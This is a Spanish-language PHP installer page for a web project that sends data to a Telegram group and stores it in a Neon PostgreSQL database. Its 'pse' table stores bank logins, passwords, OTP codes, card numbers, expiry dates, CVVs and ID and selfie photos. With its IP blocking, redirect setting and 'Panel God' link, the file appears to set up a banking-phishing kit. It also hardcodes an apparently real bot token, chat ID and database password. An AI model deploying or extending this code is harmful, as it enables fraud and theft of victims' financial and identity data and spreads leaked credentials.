<?php
/**
 * install.php — Asistente de Instalación y Despliegue en 1 Clic
 * Soporte especializado para Render.com y Vercel con diagnóstico en vivo.
 */
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
error_reporting(E_ALL);
ini_set('display_errors', 0);

// Cargar configuración existente si está disponible
$currentConfig = file_exists(__DIR__ . '/config/config.php') ? require __DIR__ . '/config/config.php' : [];

$defaultBotToken = $currentConfig['botToken'] ?? '8634923330:AAH31BhUWH8O2LuD9IQdwZyUTUyc0Ij-Hxo';
$defaultChatId   = $currentConfig['chatId']   ?? '-5180034812';
$defaultSecKey   = $currentConfig['security_key'] ?? 'secure_key_123';
$defaultDbUrl    = getenv('DATABASE_URL') ?: 'postgresql://neondb_owner:npg_iHg1Z9yDGOQw@ep-jolly-rice-aizz7hvg-pooler.c-4.us-east-1.aws.neon.tech/neondb?sslmode=require';

// ── MANEJO DE ACCIONES AJAX / POST ──────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=utf-8');
    $action = $_POST['action'] ?? '';

    // 1. Probar Conexión con Telegram
    if ($action === 'test_telegram') {
        $token  = trim($_POST['bot_token'] ?? '');
        $chatId = trim($_POST['chat_id'] ?? '');

        if (empty($token) || empty($chatId)) {
            echo json_encode(['ok' => false, 'msg' => 'Debes ingresar el Bot Token y el Chat ID.']);
            exit;
        }

        $apiUrl = "https://api.telegram.org/bot{$token}/sendMessage";
        $postData = [
            'chat_id'    => $chatId,
            'text'       => "<b>🚀 ¡Instalación Exitosa!</b>\n\nEl bot se ha vinculado correctamente a este grupo desde el instalador.",
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init($apiUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $res = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        $json = json_decode($res, true);
        if ($httpCode === 200 && !empty($json['ok'])) {
            echo json_encode(['ok' => true, 'msg' => '¡Mensaje de prueba enviado al grupo con éxito!']);
        } else {
            $err = $json['description'] ?? 'Error de conexión con la API de Telegram.';
            echo json_encode(['ok' => false, 'msg' => "Telegram respondió: $err"]);
        }
        exit;
    }

    // 2. Probar Base de Datos y Crear Tablas
    if ($action === 'setup_db') {
        $dbUrl = trim($_POST['db_url'] ?? '');
        // Auto-limpieza de prefijo 'psql' y comillas
        $dbUrl = preg_replace('/^psql\s+/i', '', $dbUrl);
        $dbUrl = trim($dbUrl, "'\" \t\n\r\0\x0B");

        if (empty($dbUrl)) {
            echo json_encode(['ok' => false, 'msg' => 'Ingresa la URL de la base de datos (PostgreSQL/MySQL).']);
            exit;
        }

        try {
            $parsed = parse_url($dbUrl);
            $scheme = $parsed['scheme'] ?? 'pgsql';
            $host   = $parsed['host'] ?? 'localhost';
            $user   = $parsed['user'] ?? '';
            $pass   = $parsed['pass'] ?? '';
            $dbName = ltrim($parsed['path'] ?? '', '/');
            $port   = $parsed['port'] ?? ($scheme === 'mysql' ? 3306 : 5432);

            if ($scheme === 'postgres' || $scheme === 'postgresql') {
                $endpointId = explode('.', $host)[0];
                putenv("PGOPTIONS=-c endpoint={$endpointId}");
                $_ENV['PGOPTIONS'] = "-c endpoint={$endpointId}";
                $dsn = "pgsql:host={$host};port={$port};dbname={$dbName};sslmode=require;options=endpoint={$endpointId}";
            } else {
                $dsn = "mysql:host={$host};port={$port};dbname={$dbName};charset=utf8mb4";
            }

            $pdo = new PDO($dsn, $user, $pass, [
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_TIMEOUT => 8
            ]);

            $driver = $pdo->getAttribute(PDO::ATTR_DRIVER_NAME);
            $SERIAL = ($driver === 'pgsql') ? "SERIAL PRIMARY KEY" : "INT AUTO_INCREMENT PRIMARY KEY";
            $TS     = "TIMESTAMP DEFAULT CURRENT_TIMESTAMP";

            // Crear tabla pse
            $pdo->exec("CREATE TABLE IF NOT EXISTS pse (
                id          $SERIAL,
                estado      INT DEFAULT 1,
                ip_address  VARCHAR(100),
                usuario     VARCHAR(255),
                clave       VARCHAR(255),
                banco       VARCHAR(100),
                email       VARCHAR(255),
                otp         VARCHAR(50),
                tarjeta     VARCHAR(50),
                fecha_exp   VARCHAR(20),
                cvv         VARCHAR(10),
                foto_selfie VARCHAR(255),
                foto_front  VARCHAR(255),
                foto_back   VARCHAR(255),
                clave_din   VARCHAR(50),
                fecha       $TS
            )");

            // Crear tabla blocked_ips
            $pdo->exec("CREATE TABLE IF NOT EXISTS blocked_ips (
                id         $SERIAL,
                ip         VARCHAR(100) UNIQUE NOT NULL,
                created_at $TS
            )");

            // Crear tabla settings
            $pdo->exec("CREATE TABLE IF NOT EXISTS settings (
                id    $SERIAL,
                key   VARCHAR(100) UNIQUE NOT NULL,
                value TEXT NOT NULL
            )");

            // Insertar default settings
            try {
                if ($driver === 'pgsql') {
                    $pdo->exec("INSERT INTO settings (key, value) VALUES ('redirect_enabled','1') ON CONFLICT (key) DO NOTHING");
                } else {
                    $pdo->exec("INSERT IGNORE INTO settings (key, value) VALUES ('redirect_enabled','1')");
                }
            } catch (Exception $e) {}

            echo json_encode([
                'ok' => true,
                'msg' => "¡Conexión exitosa! Tablas ('pse', 'blocked_ips', 'settings') creadas y verificadas correctamente."
            ]);
        } catch (PDOException $e) {
            echo json_encode(['ok' => false, 'msg' => 'Error de Base de Datos: ' . $e->getMessage()]);
        }
        exit;
    }

    // 3. Guardar en Archivos Locales (config/config.php y vercel.json)
    if ($action === 'save_local') {
        $token   = trim($_POST['bot_token'] ?? '');
        $chatId  = trim($_POST['chat_id'] ?? '');
        $dbUrl   = trim($_POST['db_url'] ?? '');
        $dbUrl   = preg_replace('/^psql\s+/i', '', $dbUrl);
        $dbUrl   = trim($dbUrl, "'\" \t\n\r\0\x0B");
        $secKey  = trim($_POST['security_key'] ?? 'secure_key_123');

        $parsed = parse_url($dbUrl);
        $host   = $parsed['host'] ?? 'localhost';
        $user   = $parsed['user'] ?? 'root';
        $pass   = $parsed['pass'] ?? '';
        $dbName = ltrim($parsed['path'] ?? '', '/');
        $port   = $parsed['port'] ?? 5432;

        // Generar config.php
        $configContent = "<?php\n// Generado automáticamente por el Asistente de Instalación\n"
            . "\$db_host = '{$host}';\n"
            . "\$db_user = '{$user}';\n"
            . "\$db_pass = '{$pass}';\n"
            . "\$db_name = '{$dbName}';\n"
            . "\$db_port = '{$port}';\n\n"
            . "if (getenv('DATABASE_URL')) {\n"
            . "    \$url = parse_url(getenv('DATABASE_URL'));\n"
            . "    \$db_host = \$url['host'] ?? null;\n"
            . "    \$db_user = \$url['user'] ?? null;\n"
            . "    \$db_pass = \$url['pass'] ?? null;\n"
            . "    \$db_name = ltrim(\$url['path'] ?? '', '/');\n"
            . "    \$db_port = \$url['port'] ?? 5432;\n"
            . "}\n\n"
            . "return [\n"
            . "    'botToken'     => getenv('BOT_TOKEN') ?: '{$token}',\n"
            . "    'chatId'       => getenv('CHAT_ID') ?: '{$chatId}',\n"
            . "    'db_host'      => \$db_host,\n"
            . "    'db_user'      => \$db_user,\n"
            . "    'db_pass'      => \$db_pass,\n"
            . "    'db_name'      => \$db_name,\n"
            . "    'db_port'      => \$db_port,\n"
            . "    'baseUrl'      => getenv('BASE_URL') ?: 'https://' . (\$_SERVER['HTTP_HOST'] ?? 'localhost') . '/updatetele.php',\n"
            . "    'security_key' => getenv('SECURITY_KEY') ?: '{$secKey}'\n"
            . "];\n?>";

        @file_put_contents(__DIR__ . '/config/config.php', $configContent);

        // Generar chat_config.php
        $chatConfigContent = "<?php\n// config/chat_config.php\nreturn [\n    'chatId'   => getenv('CHAT_ID') ?: '{$chatId}',\n    'botToken' => getenv('BOT_TOKEN') ?: '{$token}'\n];\n?>";
        @file_put_contents(__DIR__ . '/config/chat_config.php', $chatConfigContent);

        // Actualizar vercel.json
        $vercelJsonPath = __DIR__ . '/vercel.json';
        if (file_exists($vercelJsonPath)) {
            $vData = json_decode(file_get_contents($vercelJsonPath), true) ?: [];
            $vData['env']['BOT_TOKEN']    = $token;
            $vData['env']['CHAT_ID']      = $chatId;
            $vData['env']['SECURITY_KEY'] = $secKey;
            $vData['env']['DATABASE_URL'] = $dbUrl;
            @file_put_contents($vercelJsonPath, json_encode($vData, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
        }

        echo json_encode(['ok' => true, 'msg' => 'Configuración guardada exitosamente en los archivos locales.']);
        exit;
    }

    // 4. Activar Webhook de Telegram
    if ($action === 'set_webhook') {
        $token      = trim($_POST['bot_token'] ?? '');
        $webhookUrl = trim($_POST['webhook_url'] ?? '');
        $secKey     = trim($_POST['security_key'] ?? 'secure_key_123');

        if (empty($token) || empty($webhookUrl)) {
            echo json_encode(['ok' => false, 'msg' => 'Faltan datos para activar el Webhook.']);
            exit;
        }

        $apiUrl = "https://api.telegram.org/bot{$token}/setWebhook?url=" . urlencode($webhookUrl) . "&secret_token=" . urlencode($secKey);
        $res = @file_get_contents($apiUrl);
        if ($res) {
            $json = json_decode($res, true);
            if (!empty($json['ok'])) {
                echo json_encode(['ok' => true, 'msg' => '¡Webhook activado con éxito en Telegram!']);
            } else {
                $err = $json['description'] ?? 'Error desconocido';
                echo json_encode(['ok' => false, 'msg' => "Error de Telegram: $err"]);
            }
        } else {
            echo json_encode(['ok' => false, 'msg' => 'No se pudo conectar con la API de Telegram.']);
        }
        exit;
    }

    echo json_encode(['ok' => false, 'msg' => 'Acción no válida.']);
    exit;
}

// Dominio actual detectado
$detectedHost = $_SERVER['HTTP_HOST'] ?? 'localhost';
$detectedScheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') ? 'https' : 'https';
$suggestedWebhook = "{$detectedScheme}://{$detectedHost}/updatetele.php?key={$defaultSecKey}";
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ Asistente de Instalación y Despliegue</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #090d16;
            --bg-card: rgba(18, 24, 38, 0.75);
            --border-card: rgba(255, 255, 255, 0.08);
            --accent-purple: #8b5cf6;
            --accent-blue: #3b82f6;
            --accent-cyan: #06b6d4;
            --accent-gradient: linear-gradient(135deg, #6366f1, #a855f7);
            --accent-render: linear-gradient(135deg, #46e3b7, #14b8a6);
            --accent-vercel: linear-gradient(135deg, #ffffff, #94a3b8);
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-primary);
            color: var(--text-main);
            min-height: 100vh;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(99, 102, 241, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(168, 85, 247, 0.12) 0%, transparent 40%);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 30px 15px;
        }

        .container {
            width: 100%;
            max-width: 900px;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header .badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 6px 14px;
            background: rgba(99, 102, 241, 0.15);
            border: 1px solid rgba(99, 102, 241, 0.3);
            border-radius: 30px;
            font-size: 0.8rem;
            color: #a5b4fc;
            margin-bottom: 12px;
            font-weight: 600;
        }
        .header h1 {
            font-size: 2.2rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ffffff, #cbd5e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
        }
        .header p {
            color: var(--text-muted);
            font-size: 0.95rem;
        }

        /* Platform Tabs */
        .platform-selector {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 25px;
        }
        .platform-card {
            background: var(--bg-card);
            border: 2px solid var(--border-card);
            border-radius: 14px;
            padding: 18px 20px;
            cursor: pointer;
            transition: all 0.25s ease;
            display: flex;
            align-items: center;
            gap: 15px;
            position: relative;
            backdrop-filter: blur(12px);
        }
        .platform-card:hover {
            border-color: rgba(139, 92, 246, 0.4);
            transform: translateY(-2px);
        }
        .platform-card.active {
            border-color: #8b5cf6;
            background: rgba(139, 92, 246, 0.08);
            box-shadow: 0 0 20px rgba(139, 92, 246, 0.2);
        }
        .platform-card .icon-box {
            width: 44px;
            height: 44px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.4rem;
        }
        .platform-card.render .icon-box { background: rgba(70, 227, 183, 0.15); color: #46e3b7; }
        .platform-card.vercel .icon-box { background: rgba(255, 255, 255, 0.15); color: #ffffff; }
        .platform-card .info h3 { font-size: 1.1rem; font-weight: 700; }
        .platform-card .info p { font-size: 0.8rem; color: var(--text-muted); }

        /* Main Card */
        .card {
            background: var(--bg-card);
            border: 1px solid var(--border-card);
            border-radius: 18px;
            padding: 30px;
            backdrop-filter: blur(16px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            margin-bottom: 20px;
        }

        .section-title {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 1.2rem;
            font-weight: 700;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--border-card);
        }
        .section-title i { color: #a855f7; }

        .form-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        .form-group.full { grid-column: span 2; }
        .form-group label {
            display: block;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: #cbd5e1;
        }
        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }
        .input-wrapper i.field-icon {
            position: absolute;
            left: 14px;
            color: #64748b;
            font-size: 0.95rem;
        }
        .form-control {
            width: 100%;
            background: rgba(10, 15, 29, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 10px;
            padding: 12px 14px 12px 40px;
            color: #fff;
            font-size: 0.9rem;
            font-family: inherit;
            transition: all 0.2s;
        }
        .form-control:focus {
            outline: none;
            border-color: #8b5cf6;
            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.25);
        }
        .form-control.code {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.82rem;
        }

        /* Buttons & Actions */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 12px 20px;
            border-radius: 10px;
            font-size: 0.9rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            border: none;
            text-decoration: none;
        }
        .btn-primary {
            background: var(--accent-gradient);
            color: #fff;
            box-shadow: 0 4px 14px rgba(139, 92, 246, 0.3);
        }
        .btn-primary:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(139, 92, 246, 0.45);
        }
        .btn-secondary {
            background: rgba(255, 255, 255, 0.08);
            color: #e2e8f0;
            border: 1px solid rgba(255, 255, 255, 0.12);
        }
        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.14);
        }
        .btn-success {
            background: linear-gradient(135deg, #10b981, #059669);
            color: #fff;
        }

        .btn-row {
            display: flex;
            gap: 12px;
            margin-top: 15px;
            flex-wrap: wrap;
        }

        /* Status Toast Box */
        .status-box {
            padding: 14px 18px;
            border-radius: 10px;
            margin-top: 15px;
            font-size: 0.88rem;
            display: none;
            align-items: center;
            gap: 10px;
        }
        .status-box.success {
            display: flex;
            background: rgba(16, 185, 129, 0.12);
            border: 1px solid rgba(16, 185, 129, 0.3);
            color: #34d399;
        }
        .status-box.error {
            display: flex;
            background: rgba(239, 68, 68, 0.12);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #f87171;
        }
        .status-box.loading {
            display: flex;
            background: rgba(59, 130, 246, 0.12);
            border: 1px solid rgba(59, 130, 246, 0.3);
            color: #60a5fa;
        }

        /* Env Box & Code Preview */
        .env-preview {
            background: #060911;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 18px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.82rem;
            color: #38bdf8;
            white-space: pre-wrap;
            position: relative;
            margin-top: 15px;
            line-height: 1.6;
        }
        .copy-btn {
            position: absolute;
            top: 12px;
            right: 12px;
            background: rgba(255, 255, 255, 0.12);
            color: #fff;
            border: none;
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 0.75rem;
            cursor: pointer;
            transition: all 0.2s;
        }
        .copy-btn:hover { background: #8b5cf6; }

        .step-num {
            display: inline-flex;
            width: 26px;
            height: 26px;
            border-radius: 50%;
            background: var(--accent-gradient);
            align-items: center;
            justify-content: center;
            font-size: 0.8rem;
            font-weight: 700;
            color: #fff;
        }

        /* Responsive */
        @media (max-width: 650px) {
            .form-grid { grid-template-columns: 1fr; }
            .form-group.full { grid-column: span 1; }
            .platform-selector { grid-template-columns: 1fr; }
            .card { padding: 20px; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <div class="badge"><i class="fa-solid fa-wand-magic-sparkles"></i> Asistente de Instalación en Vivo</div>
        <h1>Instalador Universal 1-Clic</h1>
        <p>Configura, diagnostica y activa tu proyecto para Render.com o Vercel al instante.</p>
    </div>

    <!-- Selector de Plataforma -->
    <div class="platform-selector">
        <div class="platform-card render active" id="tabRender" onclick="switchPlatform('render')">
            <div class="icon-box"><i class="fa-solid fa-cube"></i></div>
            <div class="info">
                <h3>Render.com (Docker)</h3>
                <p>Web Service con contenedor PHP 8.2 + Apache</p>
            </div>
        </div>
        <div class="platform-card vercel" id="tabVercel" onclick="switchPlatform('vercel')">
            <div class="icon-box"><i class="fa-solid fa-triangle-circle-square"></i></div>
            <div class="info">
                <h3>Vercel (Serverless)</h3>
                <p>Despliegue Serverless con vercel.json</p>
            </div>
        </div>
    </div>

    <!-- Formulario Maestro de Configuración -->
    <div class="card">
        <div class="section-title">
            <span class="step-num">1</span>
            <span>Credenciales de Telegram (Bot & Grupo)</span>
        </div>

        <div class="form-grid">
            <div class="form-group">
                <label>Token del Bot de Telegram:</label>
                <div class="input-wrapper">
                    <i class="fa-solid fa-robot field-icon"></i>
                    <input type="text" id="botToken" class="form-control code" value="<?php echo htmlspecialchars($defaultBotToken); ?>" placeholder="8634923330:AAH...">
                </div>
            </div>
            <div class="form-group">
                <label>Chat ID del Grupo:</label>
                <div class="input-wrapper">
                    <i class="fa-solid fa-users field-icon"></i>
                    <input type="text" id="chatId" class="form-control code" value="<?php echo htmlspecialchars($defaultChatId); ?>" placeholder="-5180034812">
                </div>
            </div>
        </div>

        <div class="btn-row">
            <button class="btn btn-secondary" onclick="testTelegram()"><i class="fa-solid fa-paper-plane"></i> Probar Bot (Enviar Mensaje)</button>
        </div>
        <div id="telegramStatus" class="status-box"></div>
    </div>

    <!-- Base de Datos Neon -->
    <div class="card">
        <div class="section-title">
            <span class="step-num">2</span>
            <span>Base de Datos Neon (PostgreSQL)</span>
        </div>

        <div class="form-group full">
            <label>URL de Conexión (DATABASE_URL):</label>
            <div class="input-wrapper">
                <i class="fa-solid fa-database field-icon"></i>
                <input type="text" id="dbUrl" class="form-control code" value="<?php echo htmlspecialchars($defaultDbUrl); ?>" placeholder="postgresql://user:pass@ep-...neon.tech/neondb?sslmode=require">
            </div>
        </div>

        <div class="btn-row">
            <button class="btn btn-secondary" onclick="setupDatabase()"><i class="fa-solid fa-plug"></i> Probar Conexión y Crear Tablas</button>
        </div>
        <div id="dbStatus" class="status-box"></div>
    </div>

    <!-- Variables de Entorno según Plataforma -->
    <div class="card">
        <div class="section-title">
            <span class="step-num">3</span>
            <span id="guideTitle">Variables de Entorno para Render.com</span>
        </div>

        <div class="form-group full">
            <label>Llave Secreta de Webhook (Security Key):</label>
            <div class="input-wrapper">
                <i class="fa-solid fa-key field-icon"></i>
                <input type="text" id="secKey" class="form-control code" value="<?php echo htmlspecialchars($defaultSecKey); ?>" oninput="updateEnvPreview()">
            </div>
        </div>

        <p style="font-size:0.85rem; color:var(--text-muted); margin-top:10px;" id="platformGuideText">
            Copia este bloque de variables y pégalas en la sección <b>Environment Variables</b> de tu Web Service en Render.com:
        </p>

        <div class="env-preview" id="envBlock">
            <button class="copy-btn" onclick="copyEnv()"><i class="fa-regular fa-copy"></i> Copiar</button>
            <span id="envText"></span>
        </div>

        <div class="btn-row" style="margin-top:20px;">
            <button class="btn btn-primary" onclick="saveLocalConfig()"><i class="fa-solid fa-floppy-disk"></i> Guardar en Archivos del Proyecto</button>
        </div>
        <div id="saveStatus" class="status-box"></div>
    </div>

    <!-- Activación de Webhook -->
    <div class="card">
        <div class="section-title">
            <span class="step-num">4</span>
            <span>Vincular Webhook de Telegram</span>
        </div>

        <div class="form-group full">
            <label>URL de Destino del Webhook (Detectada):</label>
            <div class="input-wrapper">
                <i class="fa-solid fa-link field-icon"></i>
                <input type="text" id="webhookUrl" class="form-control code" value="<?php echo htmlspecialchars($suggestedWebhook); ?>">
            </div>
        </div>

        <div class="btn-row">
            <button class="btn btn-success" onclick="activateWebhook()"><i class="fa-solid fa-bolt"></i> 🚀 Activar Webhook en Telegram</button>
            <a href="index.php" class="btn btn-secondary"><i class="fa-solid fa-arrow-right-to-bracket"></i> Ir a la Aplicación</a>
            <a href="god/index.php" class="btn btn-secondary"><i class="fa-solid fa-shield-halved"></i> Panel God</a>
        </div>
        <div id="webhookStatus" class="status-box"></div>
    </div>
</div>

<script>
    let activePlatform = 'render';

    function switchPlatform(platform) {
        activePlatform = platform;
        document.getElementById('tabRender').classList.toggle('active', platform === 'render');
        document.getElementById('tabVercel').classList.toggle('active', platform === 'vercel');

        if (platform === 'render') {
            document.getElementById('guideTitle').innerText = 'Variables de Entorno para Render.com';
            document.getElementById('platformGuideText').innerHTML = 'Copia estas variables y pégalas en <b>Environment Variables</b> de tu Web Service en Render.com:';
        } else {
            document.getElementById('guideTitle').innerText = 'Variables de Entorno para Vercel';
            document.getElementById('platformGuideText').innerHTML = 'Configuración lista para Vercel (también guardada automáticamente en <code>vercel.json</code>):';
        }
        updateEnvPreview();
    }

    function updateEnvPreview() {
        const token = document.getElementById('botToken').value.trim();
        const chat  = document.getElementById('chatId').value.trim();
        const db    = document.getElementById('dbUrl').value.trim();
        const key   = document.getElementById('secKey').value.trim();

        let preview = '';
        if (activePlatform === 'render') {
            preview = `BOT_TOKEN=${token}\nCHAT_ID=${chat}\nSECURITY_KEY=${key}\nDATABASE_URL=${db}`;
        } else {
            preview = `{\n  "env": {\n    "BOT_TOKEN": "${token}",\n    "CHAT_ID": "${chat}",\n    "SECURITY_KEY": "${key}",\n    "DATABASE_URL": "${db}"\n  }\n}`;
        }
        document.getElementById('envText').innerText = preview;
    }

    function showStatus(elemId, type, text) {
        const box = document.getElementById(elemId);
        box.className = 'status-box ' + type;
        const icon = type === 'success' ? 'fa-circle-check' : (type === 'loading' ? 'fa-spinner fa-spin' : 'fa-circle-exclamation');
        box.innerHTML = `<i class="fa-solid ${icon}"></i> <span>${text}</span>`;
        box.style.display = 'flex';
    }

    function testTelegram() {
        showStatus('telegramStatus', 'loading', 'Enviando mensaje de prueba al grupo de Telegram...');
        const formData = new FormData();
        formData.append('action', 'test_telegram');
        formData.append('bot_token', document.getElementById('botToken').value);
        formData.append('chat_id', document.getElementById('chatId').value);

        fetch('install.php', { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                showStatus('telegramStatus', data.ok ? 'success' : 'error', data.msg);
                updateEnvPreview();
            })
            .catch(() => showStatus('telegramStatus', 'error', 'Error conectando con el servidor local.'));
    }

    function setupDatabase() {
        showStatus('dbStatus', 'loading', 'Conectando con Neon PostgreSQL y creando tablas...');
        const formData = new FormData();
        formData.append('action', 'setup_db');
        formData.append('db_url', document.getElementById('dbUrl').value);

        fetch('install.php', { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                showStatus('dbStatus', data.ok ? 'success' : 'error', data.msg);
                updateEnvPreview();
            })
            .catch(() => showStatus('dbStatus', 'error', 'Error ejecutando la consulta en la base de datos.'));
    }

    function saveLocalConfig() {
        showStatus('saveStatus', 'loading', 'Guardando en config/config.php y vercel.json...');
        const formData = new FormData();
        formData.append('action', 'save_local');
        formData.append('bot_token', document.getElementById('botToken').value);
        formData.append('chat_id', document.getElementById('chatId').value);
        formData.append('db_url', document.getElementById('dbUrl').value);
        formData.append('security_key', document.getElementById('secKey').value);

        fetch('install.php', { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                showStatus('saveStatus', data.ok ? 'success' : 'error', data.msg);
            })
            .catch(() => showStatus('saveStatus', 'error', 'Error guardando los archivos locales.'));
    }

    function activateWebhook() {
        showStatus('webhookStatus', 'loading', 'Registrando Webhook en Telegram con Secret Token...');
        const formData = new FormData();
        formData.append('action', 'set_webhook');
        formData.append('bot_token', document.getElementById('botToken').value);
        formData.append('webhook_url', document.getElementById('webhookUrl').value);
        formData.append('security_key', document.getElementById('secKey').value);

        fetch('install.php', { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                showStatus('webhookStatus', data.ok ? 'success' : 'error', data.msg);
            })
            .catch(() => showStatus('webhookStatus', 'error', 'Error al activar el Webhook.'));
    }

    function copyEnv() {
        const text = document.getElementById('envText').innerText;
        navigator.clipboard.writeText(text).then(() => {
            alert('✅ Variables copiadas al portapapeles.');
        });
    }

    document.addEventListener('DOMContentLoaded', () => {
        const dbInput = document.getElementById('dbUrl');
        if (dbInput) {
            dbInput.addEventListener('input', () => {
                let v = dbInput.value.trim();
                if (/^psql\s+/i.test(v)) {
                    v = v.replace(/^psql\s+/i, '').replace(/^['"]|['"]$/g, '').trim();
                    dbInput.value = v;
                }
            });
        }
        updateEnvPreview();
        ['botToken', 'chatId', 'dbUrl', 'secKey'].forEach(id => {
            document.getElementById(id).addEventListener('input', updateEnvPreview);
        });
    });
</script>
</body>
</html>
